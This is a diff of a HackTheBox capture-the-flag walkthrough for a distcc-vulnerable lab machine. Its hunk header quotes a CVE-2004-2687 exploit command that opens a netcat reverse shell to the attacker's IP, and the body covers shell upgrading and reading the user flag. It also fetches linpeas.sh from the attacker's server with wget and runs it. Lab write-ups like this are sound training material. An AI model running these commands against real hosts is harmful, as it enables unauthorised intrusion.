@@ -42,9 +42,23 @@ Next up, python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 
 
 ![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)
 
-Let's upgrade the shell. I used the following.
-python -c 'import pty; pty.spawn("/bin/bash")' python3 and python2 didn't work.
-export TERM=xterm
-stty raw -echo && fg
-enter
-enter
+Let's upgrade the shell. I used the following. \
+python -c 'import pty; pty.spawn("/bin/bash")' python3 and python2 didn't work. \
+export TERM=xterm \
+stty raw -echo && fg \
+enter \
+enter \
+
+We're a normal user daemon. I started off with sudo -l but it asked for a password. Let's move on.
+I look around a bit and cd /home directory and do a ls and see what's there. Nothing good in the user directory but I did go into makis and find the user.txt file. I do a cat user.txt at it and we get out our first flag.  
+
+![image](https://user-images.githubusercontent.com/110210595/185814188-b2d3ad0a-a11d-4f7e-a4bc-49c2566b5fa1.png)
+
+![image](https://user-images.githubusercontent.com/110210595/185814191-f868ba55-884e-4c9e-ba39-267b4ee7455c.png)
+
+Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh \
+I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine. \
+I use python3 -m http.server 80 get the server up and running.
+On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.
+The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file.
+I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.![image](https://user-images.githubusercontent.com/110210595/185814194-a10cc4a4-932d-4d04-a91c-a5b4f4ae5cdf.png)
